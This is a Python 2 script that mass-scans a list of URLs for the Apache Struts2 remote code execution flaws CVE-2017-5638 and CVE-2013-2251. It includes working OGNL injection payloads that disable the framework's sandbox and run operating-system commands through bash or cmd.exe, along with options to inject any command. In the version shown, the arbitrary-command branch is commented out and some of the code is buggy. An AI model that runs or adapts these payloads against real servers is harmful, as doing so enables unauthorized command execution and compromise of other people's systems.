#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib2
import httplib
import multiprocessing
import argparse
import logging
import requests
import re  # normies get out


def cve_2013_vuln(location, command):

    s2_16_path = '?redirect:${#a=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletRequest\'),#b=#a.getRealPath("/"),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#b),#matt.getWriter().flush(),#matt.getWriter().close()}'
    s2_16_payloads = (
        '?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
        '?redirectAction:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
        '?action:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
    )

    raw_path = requests.get(location + quote(s2_16_path), verify=False).content.replace("\r", "").replace("\n", "")
    command = command.replace("%RAW_PATH%", raw_path)
    command = create_command(command)

    for payload in s2_16_payloads:
        result = post(location, quote(payload).replace("PAYLOAD", quote(command)))
        # if not "<html" in result.lower():
        success(str("Found path in %s" % raw_path))
        if "65a3e764068d229ee9d62906aee6cab72f96bacc" in result:
            logging.info("[!] %s is VULN to CVE-2013-2251" % location.strip('\n'))
        # return result


def post(target, data):
    try:
        response = urllib2.urlopen(target, data, timeout=25)
    except Exception as e:
        logging.error("[-] ERROR at %s; %s" % (target, e))
    result = re.compile('[\\x00-\\x08\\x0b-\\x0c\\x0e-\\x1f]').sub('', response.read())

    return result


def quote(data):
    return data.replace("#", "%23").replace("=", "%3d").replace(" ", "%20").replace("(", "%28").replace(")", "%29").replace("'", "%27")


def success(data):
    print "[+] %s" % str(data)


def create_command(input):
    return_val = ""
    for g in input.split(' '):
        return_val += '\'%s\',' % g
    return return_val.rstrip(",")


def cve_2017_vuln(url, cmd):

    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:

        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()

    except httplib.IncompleteRead, e:
        page = e.partial
    except urllib2.HTTPError as e:
        logging.error("[-] ERROR at %s; %s" % (url, e))
        page = ""
    except urllib2.URLError as e:
        logging.error("[-] ERROR at %s; %s" % (url, e))
        page = ""
    except Exception as e:
        logging.debug("[&] ERROR: uncaught exception; msg: %s" % e)
        page = ""

    if "65a3e764068d229ee9d62906aee6cab72f96bacc" in page:
        sys.stdout.write("\033[1;31m")
        logging.info("[!] %s is VULN to CVE-2017-5638" % url.strip('\n'))
        sys.stdout.write("\033[0;0m")
        return True
    else:
        logging.debug("[-] %s is NOT vulnerable." % url.strip('\n'))
        return False


if __name__ == '__main__':
    import sys

    parser = argparse.ArgumentParser(prog='URL_Injection')
    parser.add_argument('-c', '--command', dest='cmd', help="Specify the command to inject", type=str, action='store')
    parser.add_argument('-f', '--file', dest='url_list', help="Specify the list of URLs", type=str, action='store', required=True)
    parser.add_argument('-v', '--vulncheck', dest='vulntest', help="Inject the 'id' command to URLs", action='store_true')
    parser.add_argument('-s', '--select-cve', dest='cve_selector',
                        help="Select the CVE ID: 0:CVE-2017-5638, 1:CVE-2013-2251", action='store_true')
    parser.add_argument('-o', '--out-file', dest='logger_output_loc',
                        help="Specify a path/filename. Default: ./output_vulnscan.log",
                        default='output_vulnscan.log',
                        action='store_true')
    args = parser.parse_args()

    # Set Logging Configuration
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s',
                        filename=args.logger_output_loc,
                        filemode='w')
    console = logging.StreamHandler()
    console.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    console.setFormatter(formatter)
    logging.getLogger('').addHandler(console)

    with open(args.url_list) as f:
        url_obj = f.readlines()

    if args.vulntest == True:

        for x in url_obj:

            x.strip('\n')
            try:

                logging.info("[*] Checking if %s is vulnerable" % x.strip('\n'))
                q = multiprocessing.Queue()
                q = multiprocessing.Pool(processes=7)
                p = q.Process(target=cve_2017_vuln, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
                p.start()
                #p2 = q.Process(target=cve_2013_vuln, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
                #p2.start()

            except Exception as e:

                logging.error(e)

    else:

        for x in url_obj:

            x.strip()

            try:
                #logging.info("[*] Running %s on %s" % (args.cmd, x))
                #p = multiprocessing.Process(target=cve_2017_vuln, args=(x, args.cmd))
                #p.start()
                #p2 = multiprocessing.Process(target=cve_2013_vuln, args=(x, args.cmd))
                #p2.start()
                print "NOTHING ATM"

            except Exception as e:

                logging.error("[-] Shit broke on %s with error: %s" % (x, e))
                p.terminate()
